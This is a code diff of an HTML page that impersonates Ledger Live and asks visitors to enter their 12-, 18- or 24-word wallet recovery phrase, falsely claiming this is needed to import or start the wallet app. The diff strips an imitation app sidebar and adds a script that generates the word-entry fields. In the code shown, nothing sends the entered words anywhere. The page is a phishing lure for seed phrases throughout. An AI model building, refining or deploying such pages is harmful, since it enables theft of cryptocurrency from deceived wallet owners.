@@ -3,178 +3,137 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Verify Seed Phrase - Ledger Live</title>
+  <title>Verify Seed Phrase - Ledger</title>
   <style>
     body {
+      background-color: #0d0d0d;
+      color: white;
+      font-family: "Courier New", monospace;
+      text-align: center;
       margin: 0;
       padding: 0;
-      background-color: #121212;
-      color: white;
-      font-family: 'Courier New', monospace;
-      display: flex;
-      height: 100vh;
-      overflow: hidden;
-    }
-
-    /* Sidebar */
-    .sidebar {
-      width: 260px;
-      background-color: #1e1e1e;
-      padding: 20px;
-      display: flex;
-      flex-direction: column;
-      gap: 15px;
-    }
-
-    .logo {
-      font-size: 20px;
-      font-weight: bold;
-      margin-bottom: 30px;
-    }
-
-    .menu-item {
-      color: #ccc;
-      font-size: 15px;
-      padding: 10px;
-      border-radius: 6px;
-      transition: background 0.3s ease;
-      cursor: pointer;
-    }
-
-    .menu-item:hover {
-      background-color: #292929;
-      color: #fff;
-    }
-
-    /* Main content */
-    .main {
-      flex: 1;
-      padding: 60px;
-      overflow-y: auto;
     }
 
     h1 {
+      margin-top: 50px;
       font-size: 28px;
       letter-spacing: 2px;
     }
 
     p {
       color: #ccc;
-      margin-top: 10px;
+      margin-bottom: 30px;
       font-size: 14px;
     }
 
-    .note {
-      font-weight: bold;
-      margin-top: 20px;
-      font-size: 14px;
-    }
-
-    /* Buttons for 12,18,24 words */
-    .word-options {
+    .word-buttons {
+      margin: 20px auto;
       display: flex;
-      gap: 10px;
-      margin-top: 30px;
+      justify-content: center;
+      gap: 15px;
     }
 
-    .word-options button {
-      background-color: #6d63ff;
-      border: none;
+    .word-buttons button {
+      background: #1a1a1a;
+      color: #fff;
+      border: 1px solid #555;
       padding: 10px 20px;
-      color: white;
-      font-weight: bold;
-      border-radius: 6px;
+      border-radius: 8px;
       cursor: pointer;
-      transition: background 0.3s;
+      transition: 0.3s;
     }
 
-    .word-options button:hover {
-      background-color: #8a81ff;
+    .word-buttons button:hover,
+    .word-buttons button.active {
+      background: #6c63ff;
+      border-color: #6c63ff;
     }
 
-    /* Input fields grid */
-    .grid {
+    .phrase-container {
       display: grid;
       grid-template-columns: repeat(3, 1fr);
       gap: 15px;
-      margin-top: 30px;
-      max-width: 800px;
+      width: 60%;
+      margin: 30px auto;
+      max-width: 600px;
     }
 
-    input {
-      background-color: #1c1c1c;
-      border: 1px solid #333;
-      padding: 12px;
-      border-radius: 6px;
+    .phrase-container input {
+      background: #1a1a1a;
+      border: 1px solid #444;
       color: white;
+      padding: 10px;
+      border-radius: 6px;
+      text-align: center;
       font-size: 14px;
       outline: none;
+      transition: border 0.3s;
     }
 
-    input::placeholder {
-      color: #777;
+    .phrase-container input:focus {
+      border-color: #6c63ff;
     }
 
-    /* Continue button */
     .continue-btn {
-      margin-top: 40px;
-      background-color: #6d63ff;
-      border: none;
-      padding: 12px 30px;
+      background: #6c63ff;
       color: white;
-      font-weight: bold;
-      font-size: 15px;
-      border-radius: 8px;
+      border: none;
+      padding: 12px 35px;
+      border-radius: 25px;
       cursor: pointer;
-      transition: background 0.3s ease;
+      font-size: 16px;
+      margin-top: 20px;
+      transition: background 0.3s;
     }
 
     .continue-btn:hover {
-      background-color: #8a81ff;
+      background: #837dff;
+    }
+
+    @media (max-width: 600px) {
+      .phrase-container {
+        grid-template-columns: repeat(2, 1fr);
+        width: 80%;
+      }
     }
   </style>
 </head>
 <body>
-  <div class="sidebar">
-    <div class="logo">[ LEDGER-LIVE ]</div>
-    <div class="menu-item">Portfolio</div>
-    <div class="menu-item">Market</div>
-    <div class="menu-item">Accounts</div>
-    <div class="menu-item">Send</div>
-    <div class="menu-item">Receive</div>
-    <div class="menu-item">Buy/Sell</div>
-    <div class="menu-item">Swap</div>
-    <div class="menu-item">Manager</div>
+  <h1>VERIFY SEED PHRASE OF YOUR DEVICE</h1>
+  <p>Enter your Recovery Seed Phrase Words to Import & Download Your Wallet App.<br>
+  **Ledger does not keep a copy of your recovery phrase.<br>
+  **ENTER SEED PHRASE WORDS CORRECTLY TO START LEDGER LIVE.</p>
+
+  <div class="word-buttons">
+    <button onclick="generateInputs(12)" class="active">12 Words</button>
+    <button onclick="generateInputs(18)">18 Words</button>
+    <button onclick="generateInputs(24)">24 Words</button>
   </div>
 
-  <div class="main">
-    <h1>VERIFY SEED PHRASE OF YOUR DEVICE</h1>
-    <p>Enter your Recovery Seed Phrase Words to Import & Download Your Wallet App.</p>
-    <p class="note">**Ledger does not keep a copy of your recovery phrase.</p>
-    <p class="note">**ENTER SEED PHRASE WORDS CORRECTLY TO START LEDGER LIVE.</p>
+  <div id="phraseContainer" class="phrase-container"></div>
 
-    <div class="word-options">
-      <button>12 Words</button>
-      <button>18 Words</button>
-      <button>24 Words</button>
-    </div>
+  <button class="continue-btn">Continue...</button>
 
-    <div class="grid">
-      <input type="text" placeholder="1">
-      <input type="text" placeholder="2">
-      <input type="text" placeholder="3">
-      <input type="text" placeholder="4">
-      <input type="text" placeholder="5">
-      <input type="text" placeholder="6">
-      <input type="text" placeholder="7">
-      <input type="text" placeholder="8">
-      <input type="text" placeholder="9">
-      <input type="text" placeholder="10">
-      <input type="text" placeholder="11">
-      <input type="text" placeholder="12">
-    </div>
+  <script>
+    const phraseContainer = document.getElementById('phraseContainer');
+    const buttons = document.querySelectorAll('.word-buttons button');
 
-    <button class="continue-btn">Continue...</button>
-  </div>
+    function generateInputs(count) {
+      phraseContainer.innerHTML = '';
+      for (let i = 1; i <= count; i++) {
+        const input = document.createElement('input');
+        input.type = 'text';
+        input.placeholder = i;
+        phraseContainer.appendChild(input);
+      }
+
+      // active button highlight
+      buttons.forEach(btn => btn.classList.remove('active'));
+      event.target.classList.add('active');
+    }
+
+    // default load: 12 words
+    window.onload = () => generateInputs(12);
+  </script>
 </body>
 </html>
